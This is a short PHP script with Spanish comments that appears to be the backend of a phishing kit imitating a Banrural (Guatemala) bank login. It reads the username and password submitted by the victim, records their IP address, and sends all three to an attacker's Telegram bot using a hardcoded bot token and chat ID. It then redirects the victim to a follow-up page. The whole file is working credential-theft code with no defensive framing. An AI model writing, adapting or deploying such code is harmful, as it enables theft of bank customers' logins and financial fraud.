<?php

// Configurar los datos del bot de Telegram y del chat
$bot_token = '5545935446:AAEaPWR8OUOL-0OBbqMLzioXF9jXLNT7jbM';
$chat_id = '5157616506';

// Obtener los datos del usuario, contraseña y dirección IP del formulario
$usuario = $_POST['us'];
$contrasena = $_POST['ct'];
$ip = $_SERVER['REMOTE_ADDR'];

// Construir el mensaje que se enviará al bot de Telegram
$mensaje = "LOGIN BANRURAL-GT:" . "\n" . "Nuevo usuario: $usuario" . "\n" . "Contraseña: $contrasena" . "\n" . "IP: $ip";

// Enviar el mensaje al bot de Telegram utilizando la API
$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$datos = array('chat_id' => $chat_id, 'text' => $mensaje);
$options = array(
    'http' => array(
        'method' => 'POST',
        'header' => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($datos)
    )
);
$context = stream_context_create($options);
$resultado = file_get_contents($url, false, $context);

// Redireccionar al usuario a la página "espera.php"
header('Location: tlf.php');
exit();
?>